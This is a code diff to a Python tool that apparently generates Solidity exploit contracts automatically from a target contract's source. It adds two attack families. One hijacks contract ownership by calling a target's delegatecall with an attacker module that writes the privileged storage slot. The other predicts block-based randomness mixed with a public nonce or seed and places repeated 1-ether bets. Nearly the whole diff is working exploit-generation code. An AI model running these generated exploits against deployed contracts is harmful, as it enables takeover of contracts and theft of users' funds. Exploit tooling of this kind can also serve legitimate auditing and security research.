@@ -44,6 +44,8 @@ def iter_defi_families(src: str, name: str) -> Iterator[Tuple[str, str]]:
     yield from _metamorphic(s, fns, name)
     yield from _commit_reveal(s, fns, name)
     yield from _external_erc(s, fns, name)
+    yield from _owner_slot_hijack(s, fns, name)
+    yield from _mixed_entropy(s, fns, name)
 
 
 def _unpermissioned_callback(s, fns, name):
@@ -1011,4 +1013,93 @@ def _external_erc(s, fns, name):
         + "    function onFlashLoan(address,address,uint256,uint256,bytes calldata) external returns (bytes32) {\n"
         + '        return keccak256("ERC3156FlashBorrower.onFlashLoan");\n'
         + "    }\n}\n",
+    )
+
+
+def _owner_slot_hijack(s, fns, name):
+    """delegatecall into attacker module writing owner at its real slot."""
+    from .layout import privileged_slot, pwn_hijack
+    entry = None
+    for f in fns:
+        if not f["external"]:
+            continue
+        if not re.search(r"delegatecall\s*\(", f["body"]):
+            continue
+        addr_args = [an for (t, an) in f["args"] if t == "address"]
+        if not addr_args:
+            continue
+        entry = f
+        break
+    if not entry:
+        return
+    slot = privileged_slot(s)
+    parts, call_args = [], []
+    for typ, _an in entry["args"]:
+        if typ == "address":
+            parts.append("address")
+            call_args.append("address(pwn)")
+        elif typ.startswith("bytes"):
+            parts.append("bytes calldata")
+            call_args.append('abi.encodeWithSignature("hijack()")')
+        elif typ.startswith("uint"):
+            parts.append("uint256")
+            call_args.append("0")
+        else:
+            parts.append(typ)
+            call_args.append("0")
+    yield (
+        f"owner-slot-hijack:{entry['name']}:slot{slot}",
+        HEADER
+        + f"// Family: owner_not_slot0. Pwn pads to slot {slot}.\n"
+        + f"interface IT {{ function {entry['name']}({','.join(parts)}) external; }}\n"
+        + "contract Pwn {\n"
+        + pwn_hijack(slot)
+        + "}\n"
+        + "contract Exploit {\n"
+        + "    function run(address t) external payable {\n"
+        + "        Pwn pwn = new Pwn();\n"
+        + f"        IT(t).{entry['name']}({', '.join(call_args)});\n"
+        + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _mixed_entropy(s, fns, name):
+    """block.* mixed with public nonce/seed. Read the getter, replay the mix."""
+    from .layout import rewrite_mixed, leftover_ids
+    if not re.search(r"blockhash|block\.(number|timestamp|prevrandao|difficulty)", s):
+        return
+    if not re.search(r"\bnonce\b|\bseed\b", s):
+        return
+    play = next(
+        (f for f in fns if f["external"] and re.search(
+            r"blockhash|block\.", f["body"]) and f["args"]),
+        None,
+    )
+    if not play:
+        return
+    rhs = re.search(r"=\s*([^;]*(?:block\.|blockhash)[^;]*?)\s*;", play["body"], re.S)
+    expr = rhs.group(1).strip() if rhs else "uint256(blockhash(block.number - 1))"
+    expr, getters = rewrite_mixed(expr, s, obj="t")
+    if leftover_ids(expr) and not getters:
+        return
+    gtype = "bool" if play["args"] and play["args"][0][0] == "bool" else "uint256"
+    pick = f"(({expr}) % 2 == 0)" if gtype == "bool" else f"({expr})"
+    getter_ifaces = "".join(
+        f"    function {g}() external view returns (uint256);\n" for g in getters)
+    yield (
+        f"mixed-entropy:{play['name']}",
+        HEADER
+        + "// Family: mixed_entropy. Same mix, nonce/seed read off the target.\n"
+        + "interface IT {\n"
+        + f"    function {play['name']}({gtype}) external payable;\n"
+        + getter_ifaces
+        + "}\n"
+        + "contract Exploit {\n"
+        + "    function run(address x) external payable {\n"
+        + "        IT t = IT(x);\n"
+        + "        for (uint256 i; i < 64; i++) {\n"
+        + f"            {gtype} g = {pick};\n"
+        + f"            t.{play['name']}{{value: 1 ether}}(g);\n"
+        + "        }\n"
+        + "    }\n    receive() external payable {}\n}\n",
     )
